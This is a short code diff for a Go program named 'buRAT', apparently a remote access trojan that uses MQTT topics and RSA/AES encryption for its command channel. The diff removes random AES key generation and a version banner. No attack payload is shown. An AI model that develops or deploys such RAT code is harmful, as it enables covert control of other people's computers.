@@ -5,13 +5,10 @@ import (
 
 	"./burat"
 	"./packets"
-	"io"
-	"crypto/rand"
 	"github.com/eclipse/paho.mqtt.golang"
 )
 
 func main() {
-	fmt.Println("buRAT.go v1.0")
 	burat := burat.NewBuRAT()
 
 	burat.Internals().RSA.Config(`-----BEGIN PUBLIC KEY-----
@@ -23,17 +20,6 @@ ARNKGkusuh560tVI8NHIsPjwuN3oC49xbFSiyJfaoGa3RJijsMIgPM5zgS2DyJWH
 CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
 5QIDAQAB
 -----END PUBLIC KEY-----`)
-
-	key := make([]byte, 16)
-	if _, err := io.ReadFull(rand.Reader, key); err != nil {
-		panic(err)
-	}
-
-	iv := make([]byte, 16)
-	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
-		panic(err)
-	}
-	burat.Internals().AES.Config(key, iv)
 
 	burat.AddTopics(map[string]string{
 		"nil":										"bu/nil",
